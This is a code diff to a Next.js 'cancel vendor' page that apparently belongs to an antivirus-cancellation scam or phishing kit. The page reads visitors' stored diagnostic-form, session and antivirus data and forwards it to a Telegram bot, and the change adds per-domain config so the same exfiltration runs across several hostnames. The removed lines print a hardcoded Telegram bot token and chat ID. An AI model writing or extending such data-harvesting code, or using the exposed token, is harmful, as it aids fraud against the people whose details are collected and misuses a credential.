@@ -34,26 +34,54 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
   const [mainInfo, setMainInfo] = useState<any | null>(null)
   const [sessionInfo, setSessionInfo] = useState<any | null>(null)
   const [antiVirus, setAntiVirus] = useState<string>('')
+  const [telegramConfig, setTelegramConfig] = useState<{ botToken: string; chatId: string } | null>(null)
 
   useEffect(() => {
     if (typeof window === 'undefined') return
 
-    try {
-      const mainRaw = window.sessionStorage.getItem('diagnosticForm')
-      const sessionRaw = window.sessionStorage.getItem('sessionData')
-      const avRaw = window.sessionStorage.getItem('selectedAntivirus')
+    const load = async () => {
+      try {
+        const mainRaw = window.sessionStorage.getItem('diagnosticForm')
+        const sessionRaw = window.sessionStorage.getItem('sessionData')
+        const avRaw = window.sessionStorage.getItem('selectedAntivirus')
 
-      if (mainRaw) setMainInfo(JSON.parse(mainRaw))
-      if (sessionRaw) setSessionInfo(JSON.parse(sessionRaw))
-      if (avRaw) setAntiVirus(avRaw)
-    } catch (err) {
-      console.error('Failed to read stored data', err)
+        if (mainRaw) setMainInfo(JSON.parse(mainRaw))
+        if (sessionRaw) setSessionInfo(JSON.parse(sessionRaw))
+        if (avRaw) setAntiVirus(avRaw)
+
+        // Load Telegram config based on domain
+        const res = await fetch('/telegram-config.json')
+        if (res.ok) {
+          const allConfig = await res.json()
+          const host = window.location.hostname.toLowerCase()
+          const entry = allConfig[host] || allConfig['default']
+          if (entry?.botToken && entry?.chatId) {
+            setTelegramConfig({
+              botToken: String(entry.botToken),
+              chatId: String(entry.chatId),
+            })
+          } else {
+            console.error('No Telegram config found for host', host)
+          }
+        } else {
+          console.error('Failed to load telegram-config.json')
+        }
+      } catch (err) {
+        console.error('Failed to read stored data', err)
+      }
     }
+
+    load()
   }, [])
 
   const sendCancelToTelegram = async () => {
-    const BOT_TOKEN = '8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8'
-    const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5294276637'
+    if (!telegramConfig) {
+      console.error('Telegram config not loaded; cannot send message')
+      return
+    }
+
+    const BOT_TOKEN = telegramConfig.botToken
+    const CHAT_ID = telegramConfig.chatId
 
     const message = `🔔 New Cancellation Request (DPRO)
 
